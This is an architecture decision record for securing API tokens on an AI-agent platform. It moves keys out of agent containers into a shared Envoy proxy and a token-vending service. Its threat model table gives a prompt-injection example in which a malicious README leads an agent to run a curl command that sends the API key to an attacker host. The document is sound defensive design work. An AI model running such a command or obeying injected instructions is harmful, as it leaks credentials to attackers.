# ADR-022: Secure Token Architecture for Agentic Scale

## Status

**On Hold** - Deferred until auth/multi-tenant work. See ADR-024 for interim solution (GitHub only).

**2026-01-29 Update**: Architecture revised for scale. Per-agent sidecars don't scale (500GB RAM for 10K agents). Use **shared Envoy cluster** instead (5-10 proxies, ~5GB total). See issue #43 for implementation plan.

## Date

2025-12-12 (Updated: 2025-12-15, 2026-01-29)

## Context

The Syntropic137 executes untrusted code in agent containers. These agents require access to external APIs:

- **Claude API** (Anthropic) - For LLM inference ($15-75 per 1M tokens)
- **GitHub API** - For repository operations (clone, commit, push, PR)

### Current Approach (Insecure)

The initial implementation passes raw API keys directly into agent containers:

```python
# ❌ INSECURE - Token in container environment
container.run(
    environment={
        "ANTHROPIC_API_KEY": "sk-ant-api03-xxxxx",  # Leaked = $$$
        "GITHUB_TOKEN": "ghp_xxxxxx",                # Leaked = repo access
    }
)
```

### Threat Model

| Attack Vector | Likelihood | Impact | Example |
|--------------|------------|--------|---------|
| Prompt Injection | High | Critical | Malicious README tricks agent into `curl attacker.com/?key=$ANTHROPIC_API_KEY` |
| Dependency Exploit | Medium | Critical | Compromised npm package reads `process.env` |
| Container Escape | Low | Critical | Kernel exploit gains host access |
| Log Leakage | Medium | High | Token accidentally logged, shipped to monitoring |
| Replay Attack | Medium | High | Captured token reused for unauthorized access |

### Consequences of Token Leak

| Token | Blast Radius | Financial Impact |
|-------|-------------|------------------|
| Claude API Key | Unlimited API access | $100k+/month potential |
| GitHub App Key | All installed repos | Code injection, secrets theft |
| Personal Access Token | User's full access | Reputation, compliance |

### Scale Requirements

- **Target**: 100,000 concurrent agents
- **Token Requests**: ~500k/hour (assuming 5 requests/agent/hour)
- **Latency Budget**: <10ms for token injection

## Decision

Implement a **zero-trust token architecture** with the following principles:

### 1. Agent Containers Never Hold Raw API Keys

Containers receive only:
- Base URLs pointing to local sidecars
- Execution context (workflow_id, execution_id)
- No secrets whatsoever

```python
# ✅ SECURE - No tokens in container
container.run(
    environment={
        "ANTHROPIC_BASE_URL": "http://localhost:8080",  # Sidecar
        "EXECUTION_ID": "exec-abc123",                   # Context only
    }
)
```

### 2. Sidecar Proxy Pattern

Each agent pod includes a sidecar proxy (Envoy) that:
- Intercepts all outbound API requests
- Injects authentication tokens
- Logs requests for audit
- Enforces rate limits

```
┌─────────────────────────────────────────────┐
│                Agent Pod                     │
│                                             │
│  ┌─────────────┐      ┌─────────────────┐  │
│  │   Agent     │      │   Sidecar       │  │
│  │  Container  │─────▶│   (Envoy)       │──┼──▶ api.anthropic.com
│  │             │      │                 │  │
│  │  NO TOKENS  │      │  Token here     │  │
│  └─────────────┘      └─────────────────┘  │
└─────────────────────────────────────────────┘
```

### 3. Short-Lived, Scoped Tokens

Tokens issued by the Token Vending Service have:
- **Short TTL**: 5 minutes (internal), 1 hour (GitHub limit)
- **Scope**: Per-execution, per-resource
- **Spend Caps**: Maximum tokens/cost per execution

```python
@dataclass
class ScopedToken:
    token: str
    execution_id: str
    expires_at: datetime  # Now + 5 minutes
    scope: TokenScope

@dataclass
class TokenScope:
    allowed_apis: list[str]  # ["anthropic:messages"]
    allowed_repos: list[str]  # ["org/repo"]
    max_input_tokens: int
    max_output_tokens: int
    max_cost_usd: Decimal
```

### 4. Token Vending Service

A dedicated service manages token lifecycle:

```python
class TokenVendingService:
    """Issues short-lived, scoped tokens for agent operations."""

    async def vend_token(
        self,
        execution_id: str,
        api: str,  # "anthropic" | "github"
        scope: TokenScope,
    ) -> ScopedToken:
        """Issue a new scoped token.

        1. Validate execution exists and is active
        2. Check spend budget allows more tokens
        3. Generate scoped token with TTL
        4. Store in Redis with expiry
        5. Return to sidecar
        """
        ...

    async def revoke_tokens(self, execution_id: str) -> int:
        """Revoke all tokens for an execution.

        Called when:
        - Execution completes
        - Execution fails
        - Admin intervention
        """
        ...
```

### 5. Spend Tracking & Limits

Real-time tracking prevents runaway costs:

```python
class SpendTracker:
    """Tracks and limits API spend per execution."""

    async def allocate_budget(
        self,
        execution_id: str,
        workflow_type: str,
    ) -> SpendBudget:
        """Pre-allocate budget based on workflow type.

        | Workflow Type   | Input Tokens | Output Tokens | Max Cost |
        |-----------------|--------------|---------------|----------|
        | research        | 100k         | 50k           | $10      |
        | implementation  | 500k         | 200k          | $50      |
        | review          | 50k          | 20k           | $5       |
        """
        ...

    async def check_and_record(
        self,
        execution_id: str,
        input_tokens: int,
        output_tokens: int,
    ) -> bool:
        """Check budget and record usage atomically.

        Returns False if budget exceeded (request rejected).
        """
        ...
```

### 6. Full Audit Trail

Every API request is logged with context:

```json
{
  "timestamp": "2025-12-12T01:30:00Z",
  "execution_id": "exec-abc123",
  "workflow_id": "research-workflow",
  "session_id": "session-xyz",
  "api": "anthropic",
  "endpoint": "/v1/messages",
  "input_tokens": 1500,
  "output_tokens": 800,
  "cost_usd": "0.045",
  "latency_ms": 1200,
  "status": 200
}
```

## Architecture

### Component Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              Syn137 Control Plane                               │
│                                                                             │
│  ┌─────────────────┐    ┌─────────────────┐    ┌─────────────────────────┐ │
│  │  Secret Store   │    │ Token Vending   │    │   Spend Tracker         │ │
│  │  (Vault/KMS)    │    │ Service         │    │                         │ │
│  │                 │    │                 │    │                         │ │
│  │  Master Keys:   │───▶│  • Vend tokens  │───▶│  • Budget allocation    │ │
│  │  • Claude API   │    │  • 5-min TTL    │    │  • Real-time tracking   │ │
│  │  • GitHub App   │    │  • Scoped       │    │  • Alerting             │ │
│  └─────────────────┘    └────────┬────────┘    └─────────────────────────┘ │
│                                  │                                          │
│                    ┌─────────────┴─────────────┐                           │
│                    │      Redis Cluster        │                           │
│                    │  (Token + Budget Cache)   │                           │
│                    └─────────────┬─────────────┘                           │
└──────────────────────────────────┼──────────────────────────────────────────┘
                                   │
              ┌────────────────────┼────────────────────┐
              │                    │                    │
              ▼                    ▼                    ▼
       ┌────────────┐       ┌────────────┐       ┌────────────┐
       │ Agent Pod  │       │ Agent Pod  │       │ Agent Pod  │
       │            │       │            │       │            │
       │ ┌────────┐ │       │ ┌────────┐ │       │ ┌────────┐ │
       │ │Sidecar │ │       │ │Sidecar │ │       │ │Sidecar │ │
       │ │        │ │       │ │        │ │       │ │        │ │
       │ └───┬────┘ │       │ └───┬────┘ │       │ └───┬────┘ │
       │     │      │       │     │      │       │     │      │
       │ ┌───▼────┐ │       │ ┌───▼────┐ │       │ ┌───▼────┐ │
       │ │ Agent  │ │       │ │ Agent  │ │       │ │ Agent  │ │
       │ └────────┘ │       │ └────────┘ │       │ └────────┘ │
       └────────────┘       └────────────┘       └────────────┘
```

### Token Flow Sequence

```
┌─────────┐     ┌─────────┐     ┌─────────┐     ┌─────────┐     ┌─────────┐
│  Agent  │     │ Sidecar │     │  Token  │     │ Spend   │     │ Claude  │
│Container│     │ (Envoy) │     │ Vending │     │ Tracker │     │   API   │
└────┬────┘     └────┬────┘     └────┬────┘     └────┬────┘     └────┬────┘
     │               │               │               │               │
     │ POST /messages│               │               │               │
     │──────────────▶│               │               │               │
     │               │               │               │               │
     │               │ Get token     │               │               │
     │               │──────────────▶│               │               │
     │               │               │               │               │
     │               │               │ Check budget  │               │
     │               │               │──────────────▶│               │
     │               │               │               │               │
     │               │               │◀──────────────│ OK            │
     │               │               │               │               │
     │               │◀──────────────│ Token (5min)  │               │
     │               │               │               │               │
     │               │ POST + x-api-key              │               │
     │               │──────────────────────────────────────────────▶│
     │               │               │               │               │
     │               │◀──────────────────────────────────────────────│
     │               │               │               │               │
     │               │ Record usage  │               │               │
     │               │─────────────────────────────▶│               │
     │               │               │               │               │
     │◀──────────────│ Response      │               │               │
     │               │               │               │               │
```

## Alternatives Considered

### Alternative 1: Centralized API Gateway

All agents route through a single gateway that injects tokens.

**Rejected because**:
- Single point of failure
- Bottleneck at 100k scale (~5M requests/batch)
- Latency overhead (extra network hop)

### Alternative 2: Cloud-Only Execution

Use E2B/Modal for all agent execution (they handle secrets).

**Rejected because**:
- Cost prohibitive at scale ($0.20/hour × 100k = $20k/hour)
- Vendor lock-in for core functionality
- Latency for local development

### Alternative 3: Workload Identity (Cloud-Native Only)

Use GKE/EKS workload identity for automatic credential injection.

**Partially adopted**: Good for cloud deployments, but need solution for:
- Local development (Docker Compose)
- Homelab (no cloud IAM)
- Multi-cloud (different IAM systems)

### Alternative 4: Hardware Security Modules (HSM)

Store keys in HSM, sign requests at hardware level.

**Rejected because**:
- Overkill for this use case
- High cost per HSM
- Latency for signing operations

## Consequences

### Positive

✅ **Token Leak = Limited Impact**
- 5-minute window maximum
- Scoped to single execution/repo
- Spend-capped

✅ **Full Auditability**
- Every API call logged with context
- Enables security investigations
- Cost attribution per workflow

✅ **Linear Scaling**
- Sidecar per agent = no shared bottleneck
- Redis cluster for token storage scales horizontally
- 100k+ agents supported

✅ **Defense in Depth**
- Container isolation (no token)
- Sidecar isolation (token contained)
- Short TTL (time-limited)
- Scoped permissions (capability-limited)
- Spend caps (cost-limited)

### Negative

⚠️ **Operational Complexity**
- More services to deploy/monitor
- Token Vending Service is critical path
- Redis dependency for tokens

⚠️ **Latency Overhead**
- ~5ms for token injection per request
- Token refresh every 4 minutes

⚠️ **Memory Overhead**
- ~50MB per Envoy sidecar
- 100k agents = ~5TB additional RAM

### Mitigations

| Concern | Mitigation |
|---------|------------|
| Token Vending availability | Redis cluster + fallback to cached tokens |
| Sidecar memory | Lightweight proxy (Envoy = 50MB, nginx = 10MB) |
| Latency | Token caching in sidecar (refresh every 4 min) |
| Complexity | Kubernetes operators for automated deployment |

## Implementation

See: `PROJECT-PLAN_20251212_SECURE-TOKEN-ARCHITECTURE.md`

### Priority Order

1. **P0**: ADR + Documentation (this document)
2. **P0**: GitHub App client (unblock sandbox testing)
3. **P1**: Token Vending Service (foundation)
4. **P1**: Spend Tracker (cost protection)
5. **P2**: Sidecar proxy (production-ready)

## Related ADRs

- **ADR-021**: Isolated Workspace Architecture (container security)
- **ADR-004**: Environment Configuration (settings pattern)
- **ADR-017**: Scalable Event Collection (audit logging)

## References

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Envoy Proxy Documentation](https://www.envoyproxy.io/docs)
- [HashiCorp Vault Dynamic Secrets](https://www.vaultproject.io/docs/secrets/databases)
- [SPIFFE/SPIRE Workload Identity](https://spiffe.io/)
- [AWS IAM Roles for Service Accounts](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html)

---

## 2025-12-15 Update: On Hold

### Why We Paused

The sidecar proxy pattern (Envoy-based token injection) provides excellent security but introduces significant complexity:

1. **Additional Container**: Every workspace needs an Envoy sidecar (~50MB RAM each)
2. **Envoy Configuration**: Complex YAML config for ext_authz, clusters, listeners
3. **Token Injection Service**: HTTP service for Envoy to call for token lookup
4. **Network Orchestration**: Docker network config, DNS resolution, port routing
5. **Build Pipeline**: New Docker image to build/maintain (`syn-sidecar-proxy`)

Estimated implementation time: **2-3 days** for a production-ready solution.

### Interim Solution

We are implementing a **Codex-style "Setup Phase Secrets"** pattern (see ADR-024):

```
┌─────────────────────────────────────────────────────────────────┐
│ SETUP PHASE                     │ AGENT PHASE                   │
│ (secrets available)             │ (secrets CLEARED)             │
│                                 │                               │
│  • Clone private repos          │  • Agent runs                 │
│  • Configure git credentials    │  • Uses cached git creds      │
│  • Authenticate gh CLI          │  • Can push via credential    │
│  • Install private packages     │    helper (no raw token)      │
└─────────────────────────────────────────────────────────────────┘
```

This approach:
- ✅ Is used by OpenAI Codex at scale
- ✅ Much simpler to implement (hours, not days)
- ✅ Provides good security (secrets removed before agent runs)
- ⚠️ Tokens exist briefly during setup phase

### Path Forward

When we need the **maximum security** of sidecar proxy (e.g., multi-tenant production with untrusted agents), we can revisit this ADR and implement:

1. Envoy sidecar container
2. ext_authz filter calling Token Vending Service
3. Full token injection without any secrets in container

For now, ADR-024 provides adequate security for single-tenant and controlled deployments.

---

## 2026-01-29 Update: Shared Envoy Cluster Architecture

### Per-Agent Sidecars Don't Scale

The original architecture assumed per-agent sidecars. This doesn't scale:

```
❌ Per-Agent Sidecar:
   10,000 agents × 50MB = 500GB RAM just for proxies
   10,000 sidecar containers to orchestrate
```

### Revised Architecture: Shared Envoy Cluster

For 1K-10K+ agents, use a **shared Envoy proxy cluster**:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        Agent Containers (10,000)                        │
│                                                                         │
│  ┌─────┐ ┌─────┐ ┌─────┐         ┌─────┐ ┌─────┐ ┌─────┐              │
│  │Agent│ │Agent│ │Agent│  . . .  │Agent│ │Agent│ │Agent│              │
│  │ 001 │ │ 002 │ │ 003 │         │9998 │ │9999 │ │10000│              │
│  └──┬──┘ └──┬──┘ └──┬──┘         └──┬──┘ └──┬──┘ └──┬──┘              │
│     └───────┴───────┴───────┬───────┴───────┴───────┘                  │
│                             │                                           │
│                             ▼                                           │
│              ┌──────────────────────────────┐                          │
│              │     Load Balancer (L4)       │                          │
│              └──────────────┬───────────────┘                          │
│         ┌───────────────────┼───────────────────┐                      │
│         ▼                   ▼                   ▼                      │
│  ┌─────────────┐     ┌─────────────┐     ┌─────────────┐              │
│  │  Envoy #1   │     │  Envoy #2   │     │  Envoy #N   │              │
│  │  2K-3K conn │     │  2K-3K conn │     │  2K-3K conn │              │
│  │  ~500MB RAM │     │  ~500MB RAM │     │  ~500MB RAM │              │
│  │  ext_authz ─┼─────┼─────────────┼─────┼─► Token     │              │
│  │  filter     │     │             │     │   Vending   │              │
│  └──────┬──────┘     └──────┬──────┘     └──────┬──────┘              │
│         └───────────────────┼───────────────────┘                      │
│                             │                                           │
│              Connection Pool (HTTP/2 multiplexing)                      │
│              ~100-500 connections to Anthropic                          │
└─────────────────────────────┼───────────────────────────────────────────┘
                              ▼
                     api.anthropic.com
```

### Scaling Numbers

| Component | Capacity | For 10K Agents |
|-----------|----------|----------------|
| **Single Envoy** | 2,000-5,000 concurrent connections | - |
| **Envoy cluster** | 5-10 instances | 10K-50K capacity |
| **Memory per Envoy** | 500MB-1GB | **5-10GB total** |
| **Upstream connections** | HTTP/2 multiplexed | ~100-500 to Anthropic |

### How Claude CLI Traffic is Intercepted

Claude CLI and Anthropic SDK support `ANTHROPIC_BASE_URL`:

```bash
# Agent container environment
ANTHROPIC_BASE_URL=http://envoy-proxy:8080

# Claude CLI sends to proxy, not api.anthropic.com
claude -p "Hello"  # → http://envoy-proxy:8080/v1/messages
```

For maximum isolation (per Anthropic's [Secure Deployment Guide](https://console.anthropic.com/docs/en/agent-sdk/secure-deployment)):
- `--network none` removes all network interfaces
- Unix socket mounted for proxy communication
- socat bridges localhost → socket

### Current Gap: ANTHROPIC_API_KEY Still Exposed

**ADR-024 works for GitHub** (git credential helper pattern) but **NOT for Anthropic API**.

Current implementation in `WorkflowExecutionEngine.py`:
```python
# ❌ ANTHROPIC_API_KEY passed directly to agent
agent_env["ANTHROPIC_API_KEY"] = secrets.anthropic_api_key
```

The fix requires implementing this shared Envoy architecture. See issue #43 for implementation plan.

### References

- [Anthropic Secure Deployment Guide](https://console.anthropic.com/docs/en/agent-sdk/secure-deployment)
- [sandbox-runtime (Anthropic's reference)](https://github.com/anthropic-experimental/sandbox-runtime)
- Issue #43: Implementation tracking

---

## 2026-03-17 Update: Phase 1 Implemented (ISS-43)

### What Shipped

Phase 1 of the shared Envoy proxy is now implemented. Agent containers no longer receive `ANTHROPIC_API_KEY` or `CLAUDE_CODE_OAUTH_TOKEN` as environment variables.

**Architecture (single shared proxy for Mac Mini / single-tenant):**

```
Agent Container (agent-net only)
  ANTHROPIC_BASE_URL=http://syn-envoy-proxy:8081
  HTTP_PROXY=http://syn-envoy-proxy:8081
  NO API KEYS
    │
    ▼
Shared Envoy Proxy (agent-net + default)
  ext_authz → Token Injector (reads credentials from proxy's own env)
    │
    ▼
  External APIs (TLS)
```

### Key Changes

| Component | Change |
|-----------|--------|
| `WorkspaceProvisionHandler` | `with_sidecar=True`, `inject_tokens=True`. Agent env has `ANTHROPIC_BASE_URL`, `HTTP_PROXY`, `HTTPS_PROXY` — no raw API keys. |
| `WorkspaceService` | Factory uses `SharedEnvoyAdapter` instead of `DockerSidecarAdapter`. |
| `AgenticIsolationAdapter` | Workspace containers attach to `agent-net` (internal, no external egress). |
| `docker-compose.yaml` | Always-on `envoy-proxy` service with API keys. `agent-net` internal network. |
| `token_injector.py` | Refactored to service registry pattern with passthrough support (pypi, npm). |
| `envoy.yaml` | Added github.com, pypi.org, npmjs.org virtual hosts and clusters. |

### What's Deferred to Phase 2

- Per-execution credentials (Redis credential store, source IP routing)
- `--network none` + Unix socket (maximum isolation on Linux)
- Fernet encryption for credentials at rest in Redis
- Workflow YAML `required_hosts` (per-workflow domain allowlist)
- Spend budget enforcement in the token injector
- E2B adapter using native `egressTransform`
